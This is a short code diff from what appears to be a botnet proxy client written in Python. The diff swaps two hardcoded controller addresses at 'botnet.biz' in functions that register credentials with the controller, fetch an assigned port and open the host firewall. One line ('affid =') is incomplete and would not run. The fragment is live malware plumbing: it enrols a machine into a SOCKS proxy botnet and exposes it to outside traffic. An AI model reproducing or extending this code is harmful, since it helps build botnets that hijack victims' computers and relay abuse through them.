@@ -21,7 +21,7 @@ def id_generator(size=9, chars=string.ascii_uppercase + string.digits):
 
 def registerCredentials(username, password):
         affid =
-        p = urllib.request.urlopen("http://ports.botnet.biz/registration.php?usr="+username+"&pwd="+password+"&affid="+affid).read()
+        p = urllib.request.urlopen("http://underground.botnet.biz/registration.php?usr="+username+"&pwd="+password+"&affid="+affid).read()
 
 logging.basicConfig(level=logging.DEBUG)
 SOCKS_VERSION = 5
@@ -160,7 +160,7 @@ def openFirewallPort():
         p.communicate()
 
 def getPort():
-    port = urllib.request.urlopen("http://ports.botnet.biz").read()
+    port = urllib.request.urlopen("http://underground.botnet.biz/assigner.php").read()
     port = port.decode('utf-8')
     port = port.split(":")
 
